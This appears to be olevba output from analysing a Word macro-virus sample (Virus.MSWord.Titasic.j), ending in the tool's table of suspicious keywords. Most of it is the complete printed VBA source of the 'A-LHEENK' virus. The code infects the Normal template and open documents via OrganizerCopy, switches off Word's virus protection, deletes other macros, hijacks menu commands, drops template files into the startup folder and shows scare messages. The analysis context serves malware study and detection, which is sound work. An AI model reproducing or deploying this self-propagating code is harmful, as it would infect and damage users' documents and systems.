olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ALHEENK_EDAN.bas 
in file: ./Virus.MSWord.Titasic.j - OLE stream: 'Macros/VBA/ALHEENK_EDAN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public AD As Object, aDes As Variant
Public NonALHEENK_SABLENG As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean

Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo Enggeusan
nmak(0) = "ALHEENK_EDAN"
nmak(1) = "ALHEENK_SABLENG"

aSrc = MacroContainer
Set NT = NormalTemplate
    If Not DocCount Then
           Set AD = ActiveDocument
    ElseIf aSrc <> "ALHEENK_SABLENG.dot" Then
           aSrc = NT
           End If

    If aSrc = NT Then
       aSrc = NT.FullName: Set aDes = AD
    ElseIf aSrc = AD Then
           aSrc = AD.FullName: Set aDes = NT
    ElseIf aSrc = "ALHEENK_SABLENG.dot" Then
    Set aDes = NT
           aSrc = Options.DefaultFilePath(8) & "\ALHEENK_SABLENG.src"
    End If

Mhapus aDes
With aDes.VBProject
     If Not (Not hapus And .Description = "ALHEENK_EDAN" And .VBComponents.Count > 2) Then
        Mcopy aSrc, aDes, nmak
        hapus = False
        .Description = "ALHEENK_EDAN"
        If aDes = NT Then
           Options.SaveInterval = 1
           CustomizationContext = NT
           CommandBars("Tools").reset
           KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
           Command:="ToolsRecordMacroStart"
           aDes.Save
        End If
        CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
      Else
        GoTo Aksi
      End If
End With
If afound = True Then Exit Function
   Refresh
   On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
Enggeusan:
If Err.Number = 50289 Then
   MsgBox "A-LHEENK MacroVirus 'udah aktif, mati'in komputer lo kalo 'mo selamet", vbCritical, "A-LHEENK"
End If
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonALHEENK_SABLENG = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "ALHEENK_EDAN" And nmak.Name <> "ALHEENK_SABLENG" Then
        hapus = True
        If reset Then
           Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
           nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub

Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
    Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub

Sub Action()
Attribute Action.VB_ProcData.VB_Invoke_Func = "Normal.aviro.Action"
On Error Resume Next
   WBT
   MsgBox "A-LHEENK MacroVirus 'udah aktif, mati'in komputer lo kalo 'mo selamet", vbCritical, "A-LHEENK"
   WBF
End Sub

Sub FileOpen()
    ChangeCap
    WBT
    If Dialogs(80).Show <> 0 Then
       WBF
       AutoOpen
    Else
       WBF
    End If
End Sub

Sub AutoOpen()
    Application.EnableCancelKey = wdCancelDisabled
    AstMaster
    ChangeCap
    If Documents.Count > 1 Then
       For i = 1 To Documents.Count
       If Documents(i).Name <> ActiveDocument.Name Then
          Set AD = Documents(i)
              DocCount = True
              hapus = False
              AstMaster
          End If
       Next
    End If
If Now > DateSerial(1998, 9, 15) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="ALHEENK_EDAN.Action"
End
End Sub

Sub ViewVBCode()
On Error Resume Next
   SendKeys "%m%s{down}~%d'A-LHEENK MacroVirus 'udah aktif, mati'in komputer lo kalo 'mo selamet'%m"
End Sub

Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
   aExc = True
   AstMaster
   WBT
   AddIns.Unload False
   WBF
End If
   Application.EnableCancelKey = wdCancelDisabled
End Sub

Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
   WBT
If Documents.Count <> 0 Then Documents.Close
   Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
   afound = True
   For Each aAddin In AddIns
       If aAddin.Name = "ALHEENK_SABLENG.dot" Then afound = False
       Next aAddin
        
If afound = True Then
   Application.Visible = False
   Documents.Add
   AstMaster
       With ActiveDocument
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\ALHEENK_SABLENG.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\ALHEENK_SABLENG.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
       End With
End If
   Application.Quit
batal:
   WBF
End Sub

Sub ToolsMacro()
    WBF
    On Error GoTo batal
       Mhapus ActiveDocument
       If NonALHEENK_SABLENG Then
          If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".ALHEENK_EDAN.ToolsMacro": Exit Sub
             Application.DisplayAlerts = 0
             With Dialogs(215)
                  .Description = "A-LHEENK MacroVirus 'udah aktif, mati'in komputer lo kalo 'mo selamet"
                  If .Display = 1 Then .Execute
             End With
                 Application.DisplayAlerts = -1
        Else
           ViewVBCode
        End If
batal:
End Sub

Sub FileTemplates()
    WBF
    If Not reset Then Dialogs(87).Display
End Sub

Sub FormatStyle()
    WBF
    Dialogs(180).Show
End Sub

Function Refresh()
    reset = True
    FileTemplates
    Mhapus aDes
End Function

Sub AutoClose()
    Application.DisplayAlerts = -1
    With Options
         .SaveNormalPrompt = False
         .SaveInterval = 10
         .VirusProtection = False
    End With
    If ActiveWindow.Caption <> "ALHEENK_SABLENG" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
    And ActiveDocument.Name <> "ALHEENK_SABLENG.dot" Then AstMaster
    RestoreCap
End Sub

Sub FileExit()
    MsgBox "Gitu donk.....! kalo sayang 'ma Program", vbInformation, "A-LHEENK"
    AutoExit
End Sub

Sub ToolsOptions()
    Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
    Dialogs(wdDialogToolsOptions).Show
    Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "A-LHEENK SCHWARZENEGGER"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
End Sub

Sub FileNew()
    ChangeCap
    Dialogs(wdDialogFileNew).Show
    MsgBox "A-LHEENK MacroVirus 'udah aktif,                       mati'in komputer lo kalo 'mo selamet", vbCritical, "A-LHEENK"
End Sub

Function WBT()
    WordBasic.DisableAutoMacros True
End Function

Function WBF()
    WordBasic.DisableAutoMacros False
End Function


'A-LHEENK
-------------------------------------------------------------------------------
VBA MACRO ALHEENK_SABLENG.bas 
in file: ./Virus.MSWord.Titasic.j - OLE stream: 'Macros/VBA/ALHEENK_SABLENG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is just template

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

